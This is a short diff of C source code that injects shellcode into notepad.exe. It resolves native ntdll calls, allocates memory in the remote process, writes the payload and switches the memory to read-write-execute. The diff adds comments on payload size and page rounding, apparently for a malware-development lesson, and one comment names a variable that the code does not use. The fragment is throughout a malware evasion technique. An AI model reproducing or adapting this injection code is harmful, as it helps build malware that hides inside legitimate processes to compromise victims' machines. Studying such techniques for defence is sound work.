@@ -78,9 +78,11 @@ int main() {
 	fnNtCreateThreadEx			pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
 
 	// Allocate memory in notepad.exe process using NtAllocateVirtualMemory syscall
+	// sPayloadSize is the payload's size (272 bytes)
 	pNtAllocateVirtualMemory(hProcess, &pShellcodeAddress, 0, &sSizeOfShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 
 	// Write payload to the allocated memory space - pShellcodeAddress
+	// sPayloadSize's value is now 4096 since NtAllocateVirtualMemory rounds up the value of RegionSize to be a multiple of 4096
 	pNtWriteVirtualMemory(hProcess, pShellcodeAddress, &shellcode, sSizeOfShellcode, &sNumberOfBytesWritten);
 
 	// Change memory permission to RWX
